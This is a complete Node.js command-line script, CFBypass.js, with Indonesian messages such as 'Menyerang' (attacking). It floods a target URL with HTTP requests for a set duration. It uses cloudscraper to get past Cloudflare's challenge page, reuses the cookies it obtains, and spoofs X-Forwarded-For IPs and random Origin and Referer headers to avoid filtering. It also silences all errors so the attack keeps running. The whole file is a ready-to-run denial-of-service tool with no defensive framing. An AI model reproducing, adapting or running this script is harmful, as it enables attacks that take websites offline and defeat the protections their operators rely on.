const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require("randomstring");

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
}

const args = process.argv.slice(2);
if (args.length < 2) {
  console.log("Usage: node CFBypass.js <url> <time>");
  console.log("Contoh: node CFBypass.js http://example.com 60");
  process.exit(1);
}

const target = args[0];
const duration = parseInt(args[1]);

if (isNaN(duration)) {
  console.log("Durasi harus berupa angka.");
  process.exit(1);
}

console.log(`🧨 Menyerang ${target} selama ${duration} detik.\n`);

const int = setInterval(() => {
  cloudscraper.get(target, function (error, response) {
    if (error || !response || !response.request || !response.request.headers) {
      console.log('❌ Gagal mendapatkan headers dari Cloudflare.');
      return;
    }

    const cookie = response.request.headers.cookie || '';
    const useragent = response.request.headers['User-Agent'] || 'Mozilla/5.0';
    const rand = randomstring.generate(10);
    const ip = randomIP();

    const options = {
      url: target,
      headers: {
        'User-Agent': useragent,
        'Accept': '*/*',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': cookie,
        'Origin': `http://${rand}.com`,
        'Referer': `http://google.com/${rand}`,
        'X-Forwarded-For': ip
      }
    };

    request(options, () => {});
  });
}, 100);

setTimeout(() => {
  clearInterval(int);
  console.log("✅ Serangan selesai.");
  process.exit(0);
}, duration * 1000);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});